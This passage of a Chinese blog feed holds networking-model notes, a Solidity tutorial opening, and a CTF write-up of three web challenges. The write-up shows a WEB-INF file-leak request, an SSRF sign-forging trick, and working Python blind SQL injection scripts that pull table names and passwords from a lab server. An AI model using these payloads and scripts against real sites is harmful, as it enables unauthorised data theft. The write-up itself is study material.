title="会话层"></a>会话层</h2><p>向表示层实体&#x2F;用户进程提供建立连接并在连接上有序地传输数据。</p><p>这是会话也是建立同步</p><p>功能一：建立、管理、终止会话</p><p>功能二：使用校验点可使会话在通信失效时从校验点&#x2F;同步点继续恢复通信，实现数据同步。适用于传输大文件</p><h2 id="传输层"><a href="#传输层" class="headerlink" title="传输层"></a>传输层</h2><p>负责主机中两个进程的通信，即&#x3D;&#x3D;端到端&#x3D;&#x3D;的通信(也就是端口号那种)。传输单位是报文段或用户数据报。</p><p>功能一:可靠传输、不可靠传输</p><p>功能二:差错控制</p><p>功能三:流量控制</p><p>功能四:复用分用</p><blockquote><p>复用:多个应用层进程可同时使用下面传输层的服务。</p><p>分用:传输层把收到的信息分别交付给上面应用层中相应的进程，</p></blockquote><h2 id="网络层"><a href="#网络层" class="headerlink" title="网络层"></a>网络层</h2><p>主要任务是把分组从源端传到目的端，为分组交换网上的不同主机提供通信服务，网络层传输单位是数据报。</p><p>功能一:路由选择(最佳路径)</p><p>功能二:流量控制</p><p>功能三:差错控制</p><p>功能四:拥塞控制</p><blockquote><p>若所有结点都来不及接受分组，而要丢弃大量分组的话，网络就处于拥塞状态。因此要采取一定措施，缓解这种拥塞，也就是拥塞控制。</p></blockquote><p>该层主要协议：</p><p>IP、IPX、ICMP、IGMP、ARP、RARP、OSPF</p><h2 id="数据链路层"><a href="#数据链路层" class="headerlink" title="数据链路层"></a>数据链路层</h2><p>主要任务是把网络层传下来的数据报组装成帧，数据链路层&#x2F;链路层的传输单位是帧。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240305002727144.png" alt="image-20240305002727144"></p><h2 id="物理层"><a href="#物理层" class="headerlink" title="物理层"></a>物理层</h2><p>主要任务是在物理媒体上实现比特流的透明传输，物理层传输单位是比特，</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240305002907189.png" alt="image-20240305002907189"></p><h1 id="TCP-IP参考模型"><a href="#TCP-IP参考模型" class="headerlink" title="TCP&#x2F;IP参考模型"></a>TCP&#x2F;IP参考模型</h1><p>下面是一个TCP&#x2F;IP模型和起协议栈的对应图：<br><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240305003141069.png" alt="image-20240305003141069"></p><p><strong>TCP&#x2F;IP和OSI的不同之处：</strong></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240305003538566.png" alt="image-20240305003538566"></p><blockquote><p>面向连接：分为三个阶段，第一阶段建立连接，第二阶段进行数据传输，第三阶段释放连接</p><p>无连接：直接进行数据传输</p></blockquote><h1 id="5层参考模型"><a href="#5层参考模型" class="headerlink" title="5层参考模型"></a>5层参考模型</h1><p>综合了OSI和TCP&#x2F;IP的优点</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240305003806547.png" alt="image-20240305003806547"></p><p>5层模型的封装和解封装过程如下：</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240305003949042.png" alt="image-20240305003949042"></p>]]></content>
      
      
      <categories>
          
          <category> 基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buu做题记录1</title>
      <link href="/2024/03/02/buu%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%951/"/>
      <url>/2024/03/02/buu%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%951/</url>
      
        <content type="html"><![CDATA[<h1 id="RoarCTF-2019-Easy-Java"><a href="#RoarCTF-2019-Easy-Java" class="headerlink" title="[RoarCTF 2019]Easy Java"></a>[RoarCTF 2019]Easy Java</h1><p>题目是一个登陆界面，试了一下admin&#x2F;admin没反应</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240302113439732.png" alt="image-20240302113439732"></p><p>点击帮助文档出现一个java语句<strong>java.io.FileNotFoundException:{help.docx}</strong></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240302113616226.png" alt="image-20240302113616226"></p><p>应该就是啥都没有，查看源码他的链接是这样的</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240302113731820.png" alt="image-20240302113731820"></p><p>没啥思路去看别的师傅的wp，这里涉及到一个WEB-INF&#x2F;xml的文件泄露，因为这题的环境是java的web应用</p><p>参考文章：<a href="https://www.cnblogs.com/darkcyan/p/17668377.html">https://www.cnblogs.com/darkcyan/p/17668377.html</a></p><p><strong>WEB-INF知识</strong></p><p>WEB-INF是Java的WEB应用的安全目录。所谓安全就是客户端无法访问，只有服务端可以访问的目录。如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行相应映射才能访问。</p><p>这是一些主要敏感目录：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">/WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则<br>/WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在.jar文件中<br>/WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件<br>/WEB-INF/src/：源码目录，按照包名结构放置各个java文件<br>/WEB-INF/database.properties：数据库配置文件<br></code></pre></td></tr></table></figure><p>然后就去下载页面去看这些敏感目录的内容，先去看WEB-INF&#x2F;web.xml</p><p>不过这里的下载页面很奇怪，get请求的时候是下载不了的，改成post就可以了，上面的help文档也是</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240302115936170.png" alt="image-20240302115936170"></p><p>改成post去看一下文件内容</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240302120029103.png" alt="image-20240302120029103"></p><p>这是从别的师傅那找来的相关标签的用法</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&lt;servlet-class&gt;  这个就是指向我们要注册的servlet 的类地址, 要带包路径<br><br>&lt;servlet-mapping&gt;  是用来配置我们注册的组件的访问路径,里面包括两个节点<br>一个是&lt;servlet-name&gt;，这个要与前面写的servlet一致<br>另一个是&lt;url-pattern&gt;，配置这个组件的访问路径<br><br>&lt;servlet-name&gt; 这个是我们要注册servlet的名字,一般跟Servlet类名有关<br><br>举个例子<br>&lt;servlet&gt;<br>    &lt;servlet-name&gt;FlagController&lt;/servlet-name&gt;<br>    &lt;servlet-class&gt;com.wm.ctf.FlagController&lt;/servlet-class&gt;<br>&lt;/servlet&gt;<br></code></pre></td></tr></table></figure><p>然后上面的web.xml文件我们看到了flag相关的类，然后有个路径我试着去访问了一下返回500状态码，那就要去找FlagController.class文件了</p><p>因为WEB-INF&#x2F;classes里面包含了所有class文件，所以我们从该目录开始然后通过包名去写路径即可拿到想要的class文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">/Download<br><br>POST:<br>filename=WEB-INF/classes/com/wm/ctf/FlagController.class<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240302121422866.png" alt="image-20240302121422866"></p><p>然后将其中的base64字符串拿去解码即可获得flag</p><h1 id="De1CTF-2019-SSRF-Me"><a href="#De1CTF-2019-SSRF-Me" class="headerlink" title="[De1CTF 2019]SSRF Me"></a>[De1CTF 2019]SSRF Me</h1><p>题目进去就看到一段很丑陋的源代码，看源码也没有格式化好</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240303014938284.png" alt="image-20240303014938284"></p><p>直接去让gpt给我美化了一下：</p><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#! /usr/bin/env python</span><br><span class="hljs-comment"># encoding=utf-8</span><br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> request<br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> urllib<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> json<br><br>reload(sys)<br>sys.setdefaultencoding(<span class="hljs-string">&#x27;latin1&#x27;</span>)<br><br>app = Flask(__name__)<br>secert_key = os.urandom(<span class="hljs-number">16</span>)<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Task</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, action, param, sign, ip</span>):<br>        self.action = action<br>        self.param = param<br>        self.sign = sign<br>        self.sandbox = md5(ip)<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">not</span> os.path.exists(self.sandbox)):  <span class="hljs-comment"># SandBox For Remote_Addr</span><br>            os.mkdir(self.sandbox)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">Exec</span>(<span class="hljs-params">self</span>):<br>        result = &#123;&#125;<br>        result[<span class="hljs-string">&#x27;code&#x27;</span>] = <span class="hljs-number">500</span><br>        <span class="hljs-keyword">if</span> (self.checkSign()):<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;scan&quot;</span> <span class="hljs-keyword">in</span> self.action:<br>                tmpfile = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="hljs-string">&#x27;w&#x27;</span>)<br>                resp = scan(self.param)<br>                <span class="hljs-keyword">if</span> (resp == <span class="hljs-string">&quot;Connection Timeout&quot;</span>):<br>                    result[<span class="hljs-string">&#x27;data&#x27;</span>] = resp<br>                <span class="hljs-keyword">else</span>:<br>                    <span class="hljs-built_in">print</span> resp<br>                    tmpfile.write(resp)<br>                    tmpfile.close()<br>                result[<span class="hljs-string">&#x27;code&#x27;</span>] = <span class="hljs-number">200</span><br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;read&quot;</span> <span class="hljs-keyword">in</span> self.action:<br>                f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="hljs-string">&#x27;r&#x27;</span>)<br>                result[<span class="hljs-string">&#x27;code&#x27;</span>] = <span class="hljs-number">200</span><br>                result[<span class="hljs-string">&#x27;data&#x27;</span>] = f.read()<br>            <span class="hljs-keyword">if</span> result[<span class="hljs-string">&#x27;code&#x27;</span>] == <span class="hljs-number">500</span>:<br>                result[<span class="hljs-string">&#x27;data&#x27;</span>] = <span class="hljs-string">&quot;Action Error&quot;</span><br>        <span class="hljs-keyword">else</span>:<br>            result[<span class="hljs-string">&#x27;code&#x27;</span>] = <span class="hljs-number">500</span><br>            result[<span class="hljs-string">&#x27;msg&#x27;</span>] = <span class="hljs-string">&quot;Sign Error&quot;</span><br>        <span class="hljs-keyword">return</span> result<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">checkSign</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">if</span> (getSign(self.action, self.param) == self.sign):<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><span class="hljs-comment"># generate Sign For Action Scan.</span><br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/geneSign&quot;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">geneSign</span>():<br>    param = urllib.unquote(request.args.get(<span class="hljs-string">&quot;param&quot;</span>, <span class="hljs-string">&quot;&quot;</span>))<br>    action = <span class="hljs-string">&quot;scan&quot;</span><br>    <span class="hljs-keyword">return</span> getSign(action, param)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/De1ta&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">challenge</span>():<br>    action = urllib.unquote(request.cookies.get(<span class="hljs-string">&quot;action&quot;</span>))<br>    param = urllib.unquote(request.args.get(<span class="hljs-string">&quot;param&quot;</span>, <span class="hljs-string">&quot;&quot;</span>))<br>    sign = urllib.unquote(request.cookies.get(<span class="hljs-string">&quot;sign&quot;</span>))<br>    ip = request.remote_addr<br>    <span class="hljs-keyword">if</span>(waf(param)):<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;No Hacker!!!!&quot;</span><br>    task = Task(action, param, sign, ip)<br>    <span class="hljs-keyword">return</span> json.dumps(task.Exec())<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;code.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>).read()<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">scan</span>(<span class="hljs-params">param</span>):<br>    socket.setdefaulttimeout(<span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">return</span> urllib.urlopen(param).read()[:<span class="hljs-number">50</span>]<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Connection Timeout&quot;</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getSign</span>(<span class="hljs-params">action, param</span>):<br>    <span class="hljs-keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">md5</span>(<span class="hljs-params">content</span>):<br>    <span class="hljs-keyword">return</span> hashlib.md5(content).hexdigest()<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">waf</span>(<span class="hljs-params">param</span>):<br>    check = param.strip().lower()<br>    <span class="hljs-keyword">if</span> check.startswith(<span class="hljs-string">&quot;gopher&quot;</span>) <span class="hljs-keyword">or</span> check.startswith(<span class="hljs-string">&quot;file&quot;</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.debug = <span class="hljs-literal">False</span><br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">80</span>)<br><br></code></pre></td></tr></table></figure><p>根据题目的提示flag在.&#x2F;flag.txt里面</p><p>审计源码发现param和action是我们可控的参数，在Exec函数里，在通过checkSign()的校验之后，如果cookie中的aciton包含scan就写入文件，如果包含read就读取文件</p><p>这里由于waf过滤了gopher和file，就不能通过param直接传参读文件，不过urllib.urlopen()这个方法有两种方法读取本地文件</p><ul><li>直接写文件名</li><li>利用local_file协议：该协议和file的用法一样，local_file&#x2F;&#x2F;&#x2F;etc&#x2F;passwd，但是也被过滤了</li></ul><p>所以这里在param填文件名写入文件</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240303155134761.png" alt="image-20240303155134761"></p><p>然后我们就要再去将action换成read去读取，不过这里生成的sign就需要自己去构造了，因为&#x2F;geneSign路由默认的action是scan，我们去看一下getSign()函数</p><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">getSign</span>(<span class="hljs-params">action, param</span>):<br>    <span class="hljs-keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()<br></code></pre></td></tr></table></figure><p>这里我们不知道secret_key，但是&#x2F;geneSign默认action为scan，想查看文件又一定要read，所以直接后面加个read生成sign即可</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240303160239016.png" alt="image-20240303160239016"></p><p>然后我们给param传一个readsign即可，因为知识检测是否有该关键字</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240303161016765.png" alt="image-20240303161016765"></p><h1 id="极客大挑战-2019-FinalSQL"><a href="#极客大挑战-2019-FinalSQL" class="headerlink" title="[极客大挑战 2019]FinalSQL"></a>[极客大挑战 2019]FinalSQL</h1><p>这题进去有个登陆页面</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240303201649603.png" alt="image-20240303201649603"></p><p>一开始以为注入点在登陆的地方，因为直接get请求发送用户名和密码，试了一下发现没有，后才发现上面的12345会给url传递id参数</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240303201828243.png" alt="image-20240303201828243"></p><p>id传6之后的数字会发生变化，传递数字和字符串时返回的页面不一样</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240303201948963.png" alt="image-20240303201948963"></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240303202000621.png" alt="image-20240303202000621"></p><p>去尝试了一些字符发现被过滤了不想fuzz，去看wp说是^没被过滤，可以用异或来进行盲注，因为题目也有提示说盲注,参考文章：<a href="https://www.shawroot.cc/1158.html">https://www.shawroot.cc/1158.html</a></p><p>payload的大概思路就是</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">1^(sql语句)<br>//比如爆库的话可以用改语句ord(substr(database(),1,1)&gt;10),这就是判断数据库第一位的ascii码值是否大于10，ord()函数也可以用ascii()函数代替<br>//如果页面回显为ERROR!!!，表示正确，因为1^1=0<br>//如果页面回显为NO! Not this! Click others~~~即id=1时的页面，则错误，因为1^0=1<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240303214756062.png" alt="image-20240303214756062"></p><p>payload如下：</p><p>爆出库名脚本，这里直接按顺序爆下去不写二分法了</p><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br>result=<span class="hljs-string">&quot;&quot;</span><br>url=<span class="hljs-string">&quot;http://76107f08-a9a5-443e-b4b9-1e5097f55d5e.node5.buuoj.cn:81/search.php?id=1^&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">33</span>,<span class="hljs-number">127</span>):<br>        sql=<span class="hljs-string">&quot;(ord(substr(database(),%d,1))=%d)&quot;</span>%(i,j)<br>        response=requests.get(url=url+sql)<br>        time.sleep(<span class="hljs-number">0.02</span>)<br>        <span class="hljs-comment">#print(response.text)</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;ERROR&quot;</span> <span class="hljs-keyword">in</span> response.text:<br>            result+=<span class="hljs-built_in">chr</span>(j)<br>            <span class="hljs-built_in">print</span>(result)<br>            <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240303222137783.png" alt="image-20240303222137783"></p><p>然后得出数据库名为geek，这里延时了一点点，因为不知为什么会有几次漏了一些字符没有</p><p>然后改一改代码继续爆表名，参考上面文章可以用该语句先去测试一下表名长度，得出长度为16</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">1^((select(length(group_concat(TABLE_NAME)))from(information_schema.tables)where(table_schema=&quot;geek&quot;))=16)<br></code></pre></td></tr></table></figure><p>emmm后来发现不止两个表，我就直接写50个字符来爆了</p><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br>result=<span class="hljs-string">&quot;&quot;</span><br>url=<span class="hljs-string">&quot;http://76107f08-a9a5-443e-b4b9-1e5097f55d5e.node5.buuoj.cn:81/search.php?id=1^&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">50</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">33</span>,<span class="hljs-number">127</span>):<br>        sql=<span class="hljs-string">&quot;(ord(substr((select(group_concat(table_name))from(information_schema.columns)where(table_schema=&#x27;geek&#x27;)),%d,1))=%d)&quot;</span>%(i,j)<br>        response=requests.get(url=url+sql)<br>        time.sleep(<span class="hljs-number">0.02</span>)<br>        <span class="hljs-comment">#print(response.text)</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;ERROR&quot;</span> <span class="hljs-keyword">in</span> response.text:<br>            result+=<span class="hljs-built_in">chr</span>(j)<br>            <span class="hljs-built_in">print</span>(result)<br>            <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240303224502079.png" alt="image-20240303224502079"></p><p>然后爆出上面四个表名</p><p>再去爆一下字段名看看</p><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br>result=<span class="hljs-string">&quot;&quot;</span><br>url=<span class="hljs-string">&quot;http://76107f08-a9a5-443e-b4b9-1e5097f55d5e.node5.buuoj.cn:81/search.php?id=1^&quot;</span><br>name1=<span class="hljs-string">&quot;F1naI1y&quot;</span><br>name2=<span class="hljs-string">&quot;FnaI1y,&quot;</span><br>name3=<span class="hljs-string">&quot;Fa1y&quot;</span><br>name4=<span class="hljs-string">&quot;Flaaag&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">50</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">33</span>,<span class="hljs-number">127</span>):<br>        sql=<span class="hljs-string">&quot;(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;%s&#x27;)),%d,1))=%d)&quot;</span>%(name1,i,j)<br>        response=requests.get(url=url+sql)<br>        time.sleep(<span class="hljs-number">0.02</span>)<br>        <span class="hljs-comment">#print(response.text)</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;ERROR&quot;</span> <span class="hljs-keyword">in</span> response.text:<br>            result+=<span class="hljs-built_in">chr</span>(j)<br>            <span class="hljs-built_in">print</span>(result)<br>            <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><p>这个Flaaag里面没有东西，然后去爆name2，出了下面三个字段名</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240303225537909.png" alt="image-20240303225537909"></p><p>不过到后面连接超时了，不管了不想爆了()，总之在password这个字段</p><p>然后去爆password字段的值拿flag，这里用正则匹配来直接获取含有flag的数据来爆节省时间</p><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br>result=<span class="hljs-string">&quot;&quot;</span><br>url=<span class="hljs-string">&quot;http://76107f08-a9a5-443e-b4b9-1e5097f55d5e.node5.buuoj.cn:81/search.php?id=1^&quot;</span><br>name1=<span class="hljs-string">&quot;F1naI1y&quot;</span><br>name2=<span class="hljs-string">&quot;FnaI1y,&quot;</span><br>name3=<span class="hljs-string">&quot;Fa1y&quot;</span><br>name4=<span class="hljs-string">&quot;Flaaag&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>,<span class="hljs-number">80</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">33</span>,<span class="hljs-number">127</span>):<br>        sql=<span class="hljs-string">f&quot;(ord(substr((select(group_concat(password))from(F1naI1y)where((password)regexp&#x27;flag&#x27;)),<span class="hljs-subst">&#123;i&#125;</span>,1))=<span class="hljs-subst">&#123;j&#125;</span>)&quot;</span><br>        response=requests.get(url=url+sql,timeout=<span class="hljs-number">3</span>)<br>        time.sleep(<span class="hljs-number">0.02</span>)<br>        <span class="hljs-comment">#print(response.text)</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;ERROR&quot;</span> <span class="hljs-keyword">in</span> response.text:<br>            result+=<span class="hljs-built_in">chr</span>(j)<br>            <span class="hljs-built_in">print</span>(result)<br>            <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240303234305001.png" alt="image-20240303234305001"></p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf 刷题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BC入门</title>
      <link href="/2024/02/29/BC%E5%85%A5%E9%97%A8/"/>
      <url>/2024/02/29/BC%E5%85%A5%E9%97%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="智能合约入门"><a href="#智能合约入门" class="headerlink" title="智能合约入门"></a>智能合约入门</h1><h2 id="第一个合约"><a href="#第一个合约" class="headerlink" title="第一个合约"></a>第一个合约</h2><p>这是一个计数器智能合约的实例：</p><figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs js">pragma solidity &gt;=<span class="hljs-number">0.8</span><span class="hljs-number">.0</span>;<span class="hljs-comment">//声明编译器版本</span><br><span class="hljs-comment">//类似的表示还有</span><br><span class="hljs-comment">//pragma solidity &gt;=0.8.0 &lt;0.9.0;</span><br><span class="hljs-comment">//pragma solidity ^0.8.0;</span><br><br><span class="hljs-comment">// 定义一个合约</span><br>contract <span class="hljs-title class_">Counter</span> &#123;<br>    uint public counter;<br>    <br>    <span class="hljs-title function_">constructor</span>(<span class="hljs-params"></span>) &#123;<br>        counter = <span class="hljs-number">0</span>;<br>    &#125;<br>    <br>    <span class="hljs-keyword">function</span> <span class="hljs-title function_">count</span>(<span class="hljs-params"></span>) public &#123;<br>        counter = counter + <span class="hljs-number">1</span>;<br>    &#125;<br>    <br>    <span class="hljs-keyword">function</span> <span class="hljs-title function_">get</span>(<span class="hljs-params"></span>) public view returns (uint) &#123;<br>        <span class="hljs-keyword">return</span> counter;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>合约是可部署到区块链的最小单元， 一个合约通常由<strong>状态变量（合约数据）</strong>和<strong>合约函数</strong>组成。</p><h2 id="变量和函数"><a href="#变量和函数" class="headerlink" title="变量和函数"></a>变量和函数</h2><p><strong>控制可见性的关键词</strong></p><p><code>public</code> 类型的状态变量，会自动创建一个同名的外部函数（称为访问器），来获取状态变量的值</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">比如：<br>uint public a;<br>部署的时候就会有一个a()函数来获取a的值<br></code></pre></td></tr></table></figure><table><thead><tr><th></th><th>public</th><th>external</th><th>internal</th><th>private</th></tr></thead><tbody><tr><td>修饰函数</td><td>✔️</td><td>✔️</td><td>✔️</td><td>✔️</td></tr><tr><td>修饰变量</td><td>✔️</td><td></td><td>✔️</td><td>✔️</td></tr><tr><td>当前合约内可访问</td><td>✔️</td><td></td><td>✔️</td><td>✔️</td></tr><tr><td>派生合约可访问</td><td>✔️</td><td></td><td>✔️</td><td></td></tr><tr><td>外部访问</td><td>✔️</td><td>✔️</td><td></td><td></td></tr></tbody></table><p><strong>常量和不可变量</strong></p><ul><li><p>constant：在合约里可以定义常量，使用 <code>constant</code> 来声明一个常量，常量不占用合约的存储空间，而是在编译时使用对应的表达式值替换常量名。</p><p>使用<code>constant</code>修饰的状态变量，只能使用在编译时有确定值的表达式来给变量赋值。</p><p>因此任何通过访问存储数据、区块链数据（如<code>now</code>、<code>address(this).balance</code>或者<code>block.number</code>）或执行数据（<code>msg.value</code>或<code>gasleft()</code>）或对外部合约的调用来给它们赋值都是不允许的（因为它们的值无法在编译期确定）。</p><p>不过对于内建函数，如<code>keccak256</code>、<code>sha256</code>、<code>ripemd160</code>、<code>ecrecover</code>、<code>addmod</code>和<code>mulmod</code>，是允许的（尽管它们调用的是外部预编译合约），如这句代码就是合法的：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs solidity">bytes32 constant myHash = keccak256(&quot;abc&quot;);<br></code></pre></td></tr></table></figure></li><li><p>immutable： Solidity 中使用 <code>immutable</code> 来定义一个不可变量，<code>immutable</code>不可变量同样不会占用状态变量存储空间，在部署时，变量的值会被追加的运行时字节码中，因此它比使用状态变量便宜的多，同样带来了更多的安全性</p><p>不可变量在构造函数中进行赋值，构造函数是在部署的时候执行，因此这是运行时赋值。</p></li></ul><p><strong>定义函数</strong></p><p>定义函数使用function关键字，且函数可以有多个返回值</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs solidit">pragma solidity &gt;0.5.0;<br>contract C &#123;<br>    function f() public pure returns (uint, bool, uint) &#123;<br>        return (7, true, 2);<br>    &#125;<br>     function g() public &#123;<br>        // 获取返回值<br>        (uint x, bool b, uint y) = f();<br>     &#125;    <br>&#125;<br></code></pre></td></tr></table></figure><p><strong>状态可变性</strong></p><p>形容函数的可变性有 3 个关键字：</p><ul><li>view：用 view 修饰的函数，称为视图函数，它只能读取状态，而不能修改状态。</li><li>pure：用 pure 修饰的函数，称为纯函数，它既不能读取也不能修改状态。</li><li>payable：用 payable 修饰的函数表示可以接受以太币，如果未指定，该函数将自动拒绝所有发送给它的以太币。</li></ul><blockquote><p><code>view</code> , <code>pure</code> , <code>payable</code> 通常被称为修饰符</p></blockquote><h2 id="数据类型"><a href="#数据类型" class="headerlink" 